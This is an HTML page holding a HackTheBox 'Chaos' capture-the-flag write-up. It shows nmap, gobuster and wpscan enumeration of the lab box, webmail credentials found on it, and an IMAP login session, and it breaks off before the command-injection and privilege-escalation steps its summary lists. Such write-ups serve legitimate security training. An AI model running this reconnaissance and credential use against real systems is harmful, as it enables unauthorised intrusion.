@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Chaos</strong></h1>
+        <em>Released: 15th Dec 2018 / Pwned: May 18th '19 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Chaos is very much a ctf machine. Initial entry is pretty crap in my opinion but, from there on it gradually becomes more logical. In the box's defense, I learnt a fair few new things from doing this challenge.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • take the bait<br>
+        • enumerate to find a super secret blog which gives us credentials<br>
+        • get some interesting files from an email inbox and decrypt said files<br>
+        • make use of a web-based latex compiler to get a shell using command injection<br>
+        • <code>su</code> to a user we already know<br>
+        • escape jail through extraction<br>
+        • decrypt .mozilla<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 192.168.1.184</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;10.10.10.120<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-05-17&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>19&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.120<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.052s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;994&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;VERSION<br>
+                80/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.34&nbsp;((Ubuntu))<br>
+                |_http-server-header:&nbsp;Apache/2.4.34&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(text/html).<br>
+                110/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;pop3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dovecot&nbsp;pop3d<br>
+                |_pop3-capabilities:&nbsp;UIDL&nbsp;SASL&nbsp;CAPA&nbsp;STLS&nbsp;TOP&nbsp;AUTH-RESP-CODE&nbsp;PIPELINING&nbsp;RESP-CODES<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=chaos<br>
+                |&nbsp;Subject&nbsp;Alternative&nbsp;Name:&nbsp;DNS:chaos<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2018-10-28T10:01:49<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2028-10-25T10:01:49<br>
+                |_ssl-date:&nbsp;ERROR:&nbsp;Script&nbsp;execution&nbsp;failed&nbsp;(use&nbsp;-d&nbsp;to&nbsp;debug)<br>
+                143/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;imap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dovecot&nbsp;imapd&nbsp;(Ubuntu)<br>
+                |_imap-capabilities:&nbsp;listed&nbsp;have&nbsp;post-login&nbsp;LITERAL+&nbsp;more&nbsp;IMAP4rev1&nbsp;LOGIN-REFERRALS&nbsp;ID&nbsp;SASL-IR&nbsp;Pre-login&nbsp;IDLE&nbsp;STARTTLS&nbsp;ENABLE&nbsp;OK&nbsp;LOGINDISABLEDA0001&nbsp;capabilities<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=chaos<br>
+                |&nbsp;Subject&nbsp;Alternative&nbsp;Name:&nbsp;DNS:chaos<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2018-10-28T10:01:49<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2028-10-25T10:01:49<br>
+                |_ssl-date:&nbsp;TLS&nbsp;randomness&nbsp;does&nbsp;not&nbsp;represent&nbsp;time<br>
+                993/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssl/imap&nbsp;Dovecot&nbsp;imapd&nbsp;(Ubuntu)<br>
+                |_imap-capabilities:&nbsp;have&nbsp;post-login&nbsp;LITERAL+&nbsp;more&nbsp;IMAP4rev1&nbsp;LOGIN-REFERRALS&nbsp;ID&nbsp;SASL-IR&nbsp;Pre-login&nbsp;IDLE&nbsp;listed&nbsp;ENABLE&nbsp;OK&nbsp;AUTH=PLAINA0001&nbsp;capabilities<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=chaos<br>
+                |&nbsp;Subject&nbsp;Alternative&nbsp;Name:&nbsp;DNS:chaos<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2018-10-28T10:01:49<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2028-10-25T10:01:49<br>
+                |_ssl-date:&nbsp;ERROR:&nbsp;Script&nbsp;execution&nbsp;failed&nbsp;(use&nbsp;-d&nbsp;to&nbsp;debug)<br>
+                995/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssl/pop3&nbsp;Dovecot&nbsp;pop3d<br>
+                |_pop3-capabilities:&nbsp;UIDL&nbsp;SASL(PLAIN)&nbsp;CAPA&nbsp;USER&nbsp;TOP&nbsp;AUTH-RESP-CODE&nbsp;PIPELINING&nbsp;RESP-CODES<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=chaos<br>
+                |&nbsp;Subject&nbsp;Alternative&nbsp;Name:&nbsp;DNS:chaos<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2018-10-28T10:01:49<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2028-10-25T10:01:49<br>
+                |_ssl-date:&nbsp;TLS&nbsp;randomness&nbsp;does&nbsp;not&nbsp;represent&nbsp;time<br>
+                10000/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MiniServ&nbsp;1.890&nbsp;(Webmin&nbsp;httpd)<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(text/html;&nbsp;Charset=iso-8859-1).<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                TCP/IP&nbsp;fingerprint:<br>
+                OS:SCAN(V=7.70%E=4%D=5/17%OT=80%CT=1%CU=43064%PV=Y%DS=2%DC=I%G=Y%TM=5CDE7CC<br>
+                OS:7%P=i686-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O<br>
+                OS:1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11N<br>
+                OS:W7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R<br>
+                OS:=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%<br>
+                OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y<br>
+                OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R<br>
+                OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=<br>
+                OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S<br>
+                OS:)<br>
+                <br>
+                Network&nbsp;Distance:&nbsp;2&nbsp;hops<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;57.75&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        <strong>80/http</strong> is where to look first.<br>
+        <strong>110/POP3</strong> is unencrypted pop3.<br>
+        <strong>143/imap</strong> is unencrypted imap.<br>
+        <strong>993/SSL-POP</strong> is encrypted pop3.<br>
+        <strong>995/IMAPS</strong> is encrypted imap- useful later.<br>
+        <strong>10000/webmin</strong> is a web portal for managing linux machines. Don't bruteforce this, it'll lock you out.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        Turns out access via IP isn't allowed:<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Edit your hosts file to include <code>10.10.10.120 chaos.htb</code> and you'll be able to access the site.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;nano&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>hosts<br>
+                ...<br>
+                10.10.10.120&nbsp;chaos.htb<br>
+                ...<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Apparently they're still working on the blog.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        This is the only hint at what you're supposed to do next.<br>
+        The ‘Direct IP not allowed’ was actually a bait. What you should be directing your enumeration towards is <code>10.10.10.120</code>, not <code>chaos.htb</code>. Maybe you're supposed to think that 10.10.10.120 is the development part of the site after reading “we are working on blog‬ I have no idea. I only reached the conclusion to enumerate 10.10.10.120 after completely exhausting chaos.htb.<br>
+        <br>
+        Oh look, wordpress.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-w&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>common.txt&nbsp;-o&nbsp;gb-ip-common.txt<br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@TheColonial<span style="color:#ff9d00;font-weight:700">)</span><br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">dir</span><br>
+                [+]&nbsp;Url<span style="color:#ff9d00;font-weight:700">/</span>Domain&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span><br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>common.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200,204,301,302,307,403<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">true</span><br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10s<br>
+                =====================================================<br>
+                2019<span style="color:#ff9d00;font-weight:700">/</span>05<span style="color:#ff9d00;font-weight:700">/</span>17&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>58<span style="color:#ff9d00;font-weight:700">:</span>21&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span>.hta&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span>.htpasswd&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span>.htaccess&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span>index.html&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span>javascript&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;301<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span>server-status&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span>wp&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;301<span style="color:#ff9d00;font-weight:700">)</span><br>
+                =====================================================<br>
+                2019<span style="color:#ff9d00;font-weight:700">/</span>05<span style="color:#ff9d00;font-weight:700">/</span>17&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>58<span style="color:#ff9d00;font-weight:700">:</span>52&nbsp;Finished<br>
+                =====================================================
+            </div>
+        </div><br>
+        <br>
+        Follow the link on the homepage to the ‘Protected: chaos’ post:<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        The password is right infront of you - human.<br>
+        Why? I have no idea. It makes no sense.<br>
+        The only reason I guessed human was because wpscan found a user called ‘human’ when I enumerated:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;wpscan&nbsp;--url&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wordpress&nbsp;-e<br>
+                [+]&nbsp;Enumerating&nbsp;Users&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>via&nbsp;Passive&nbsp;and&nbsp;Aggressive&nbsp;Methods<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;Brute&nbsp;Forcing&nbsp;Author&nbsp;IDs&nbsp;-&nbsp;Time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;&lt;========================&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>10&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;10<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;100.00%&nbsp;Time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">:</span>00<br>
+                <br>
+                [i]&nbsp;User<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;Identified<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <br>
+                [+]&nbsp;human<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Detected&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Author&nbsp;Posts&nbsp;-&nbsp;Author&nbsp;Pattern&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Passive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Confirmed&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Rss&nbsp;Generator&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Passive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Wp&nbsp;Json&nbsp;Api&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;-&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.120<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wordpress<span style="color:#ff9d00;font-weight:700">/</span>index.php<span style="color:#ff9d00;font-weight:700">/</span>wp-json<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>v2<span style="color:#ff9d00;font-weight:700">/</span>users<span style="color:#ff9d00;font-weight:700">/</span>?per_page=100<span style="color:#ff9d00;font-weight:700">&amp;</span>page=1<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Author&nbsp;Id&nbsp;Brute&nbsp;Forcing&nbsp;-&nbsp;Author&nbsp;Pattern&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Login&nbsp;Error&nbsp;Messages&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        Afer that, you get login credentials for the webmail.<br>
+        username – ayush<br>
+        password – jiujitsu<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 993/imaps</strong></h2><br>
+        I didn't know of any webmail but from enumeration at the start we know that the email ports were open.<br>
+        IMAPS is encrypted, so you'll need to use <code>openssl</code> to connect. Using the credentials, log in to the IMAP on port 993:<br>
+        <code>openssl s_client -connect chaos.htb:993</code><br>
+        <br>
+        IMAP commands:<br>
+        <code>a LOGIN &lt;user&gt; &lt;pass&gt;</code> - to login<br>
+        <code>a LIST "" "*"</code> - to list all folders in the mailbox<br>
+        <code>a SELECT Drafts</code> - to select the Drafts mailbox (we see that there's 1 email)<br>
+        <code>a FETCH 1:* FLAGS</code> - should show the id of the email so that we can read it<br>
+        <code>a FETCH 1 (BODY.PEEK[])</code> - to read the email<br>
+        <br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;openssl&nbsp;s_client&nbsp;-connect&nbsp;chaos.htb<span style="color:#ff9d00;font-weight:700">:</span>993<br>
+                CONNECTED<span style="color:#ff9d00;font-weight:700">(</span>00000003<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ...<br>
+                [ssl&nbsp;certficate&nbsp;stuff]<br>
+                ...<br>
+                ---<br>
+                <span style="color:#ff9d00;font-weight:700">read</span>&nbsp;R&nbsp;BLOCK<br>
+                *&nbsp;OK&nbsp;[CAPABILITY&nbsp;IMAP4rev1&nbsp;SASL-IR&nbsp;LOGIN-REFERRALS&nbsp;ID&nbsp;ENABLE&nbsp;IDLE&nbsp;LITERAL+&nbsp;AUTH=PLAIN]&nbsp;Dovecot&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;ready.<br>
+                LOGIN<br>
+                LOGIN&nbsp;BAD&nbsp;First&nbsp;parameter&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;line&nbsp;is&nbsp;IMAPs&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;tag,&nbsp;not&nbsp;the&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;name.&nbsp;Add&nbsp;that&nbsp;before&nbsp;the&nbsp;command,&nbsp;like<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;a&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;user&nbsp;pass<br>
+                a&nbsp;LOGIN&nbsp;ayush&nbsp;jiujitsu<br>
+                a&nbsp;OK&nbsp;[CAPABILITY&nbsp;IMAP4rev1&nbsp;SASL-IR&nbsp;LOGIN-REFERRALS&nbsp;ID&nbsp;ENABLE&nbsp;IDLE&nbsp;SORT&nbsp;SORT=DISPLAY&nbsp;THREAD=REFERENCES&nbsp;THREAD=REFS&nbsp;THREAD=ORDEREDSUBJECT&nbsp;MULTIAPPEND&nbsp;URL-PARTIAL&nbsp;CATENATE&nbsp;UNSELECT&nbsp;CHILDREN&nbsp;NAMESPACE&nbsp;UIDPLUS&nbsp;LIST-EXTENDED&nbsp;I18NLEVEL=1&nbsp;CONDSTORE&nbsp;QRESYNC&nbsp;ESEARCH&nbsp;ESORT&nbsp;SEARCHRES&nbsp;WITHIN&nbsp;CONTEXT=SEARCH&nbsp;LIST-STATUS&nbsp;BINARY&nbsp;MOVE&nbsp;SNIPPET=FUZZY&nbsp;LITERAL+&nbsp;NOTIFY&nbsp;SPECIAL-USE]&nbsp;Logged&nbsp;<span style="color:#ff9d00;font-weight:700">in</span><br>
+                a&nbsp;LIST&nbsp;<span style="color:#3ad900;font-weight:400">""</span>&nbsp;<span style="color:#3ad900;font-weight:400">"*"</span><br>
+                *&nbsp;LIST&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#333333;font-weight:400">\N</span>oInferiors&nbsp;<span style="color:#333333;font-weight:400">\U</span>nMarked&nbsp;<span style="color:#333333;font-weight:400">\D</span>rafts<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#3ad900;font-weight:400">"/"</span>&nbsp;Drafts<br>
+                *&nbsp;LIST&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#333333;font-weight:400">\N</span>oInferiors&nbsp;<span style="color:#333333;font-weight:400">\U</span>nMarked&nbsp;<span style="color:#333333;font-weight:400">\S</span>ent<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#3ad900;font-weight:400">"/"</span>&nbsp;Sent<br>
+                *&nbsp;LIST&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#333333;font-weight:400">\H</span>asNoChildren<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#3ad900;font-weight:400">"/"</span>&nbsp;INBOX<br>
+                a&nbsp;OK&nbsp;List&nbsp;completed&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.004&nbsp;+&nbsp;0.000&nbsp;+&nbsp;0.003&nbsp;secs<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                a&nbsp;SELECT&nbsp;Drafts<br>
+                *&nbsp;FLAGS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#333333;font-weight:400">\A</span>nswered&nbsp;<span style="color:#333333;font-weight:400">\F</span>lagged&nbsp;<span style="color:#333333;font-weight:400">\D</span>eleted&nbsp;<span style="color:#333333;font-weight:400">\S</span>een&nbsp;<span style="color:#333333;font-weight:400">\D</span>raft<span style="color:#ff9d00;font-weight:700">)</span><br>
+                *&nbsp;OK&nbsp;[PERMANENTFLAGS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#333333;font-weight:400">\A</span>nswered&nbsp;<span style="color:#333333;font-weight:400">\F</span>lagged&nbsp;<span style="color:#333333;font-weight:400">\D</span>eleted&nbsp;<span style="color:#333333;font-weight:400">\S</span>een&nbsp;<span style="color:#333333;font-weight:400">\D</span>raft&nbsp;<span style="color:#333333;font-weight:400">\*</span><span style="color:#ff9d00;font-weight:700">)</span>]&nbsp;Flags&nbsp;permitted.<br>
+                *&nbsp;1&nbsp;EXISTS<br>
+                *&nbsp;0&nbsp;RECENT<br>
+                *&nbsp;OK&nbsp;[UIDVALIDITY&nbsp;1540728611]&nbsp;UIDs&nbsp;valid<br>
+                *&nbsp;OK&nbsp;[UIDNEXT&nbsp;5]&nbsp;Predicted&nbsp;next&nbsp;UID<br>
+                a&nbsp;OK&nbsp;[READ-WRITE]&nbsp;Select&nbsp;completed&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.004&nbsp;+&nbsp;0.000&nbsp;+&nbsp;0.003&nbsp;secs<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                a&nbsp;FETCH&nbsp;1<span style="color:#ff9d00;font-weight:700">:</span>*&nbsp;FLAGS<br>
+                *&nbsp;1&nbsp;FETCH&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>FLAGS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#333333;font-weight:400">\S</span>een<span style="color:#ff9d00;font-weight:700">))</span><br>
+                a&nbsp;OK&nbsp;Fetch&nbsp;completed&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.001&nbsp;+&nbsp;0.000&nbsp;secs<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                a&nbsp;FETCH&nbsp;1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>BODY.PEEK[]<span style="color:#ff9d00;font-weight:700">)</span><br>
